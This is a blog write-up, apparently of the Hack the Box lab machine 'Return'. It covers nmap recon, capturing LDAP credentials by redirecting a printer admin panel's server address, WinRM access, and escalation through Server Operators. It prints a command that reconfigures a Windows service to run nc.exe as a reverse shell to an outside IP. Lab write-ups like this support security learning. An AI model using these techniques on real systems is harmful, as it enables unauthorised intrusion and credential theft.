---
layout: post
title: "HTB: Return"
---

Return is an easy Windows box on the Hack the Box platform that focuses on abusing printer web admin panel on an active directory domain to get user LDAP credentials. Use them to log in using Evil-WinRM and discover some interesting privileges like **SeLoadDriverPrivilege** or **SeBackupPrivilege**. As a bonus the account is in the **Server Operators** group, which allows it to modify, start, and stop services. Which can be easily used to get a shell as SYSTEM.

# Recon

## nmap

```shell-session
sudo nmap -sC -sV -v -oA nmap_scan/nmap_results 10.129.95.241
```

nmap finds plenty of open ports, most interesting at the moment being ports **80** and **139,445** for **SMB**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 09:38:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
52638/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m32s
| smb2-time: 
|   date: 2024-10-30T09:39:39
|_  start_date: N/A
```

## SMB - TCP 445

Dead end at the moment, maybe we will come back when we find some credentials.

![SMB](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-10-52.png)

## Web - TCP 80

The website is a 'HTB Printer Admin Panel'
![Web](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-07.png)

# Shell as svc-printer

On the 'Settings' tab ther eis pre-filled form
![Web2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-18.png)

## Burp 

When using burp to check the POST request only one argument is send:

```
ip=printer.return.local
```
The other three fields in the form are not.
User can only change the Server Address ('ip'), and not port, username or password.

## Request

If we change the ip to our tun0 IP and start listener on port 389 we should catch some response.

![Request](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-42.png)
![Request2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-11-58.png)

...and it’s trying to authenticate so we have username and password.

## WinRM

Credentials happen to work for WinRM, so we can get a shell usin Evil-WinRM

![WinRm_shell](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-25-07.png)

and get the user flag

![WinRm_shell](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-31-22.png)

# Privilege Escalation

## Groups and Privileges

First of all, let's check our privileges,

![priv](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-50-08.png)

and also groups.

![priv2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-50-21.png)

A lot can be done with privileges like **SeLoadDriverPrivilege** or **SeBackupPrivilege** but the **Server Operators** group is quite a catch.

## Reverse shell

Server Operators can modify, start, and stop services, we can abuse this by having it run nc64.exe to give us a reverse shell.

Upload the nc.exe 

![nc](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-52-04.png)

Now modify a service binary path, stop and restart the service:

```shell-session
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.45 4444"
```
![sh](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-58-25.png)

Start listener and as soon as we start the service again we catch the shell.

![sh2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-58-54.png)

![sh2](/docs/img/HTB-Return/img/Screenshot_2024-10-30_05-58-00.png)

~
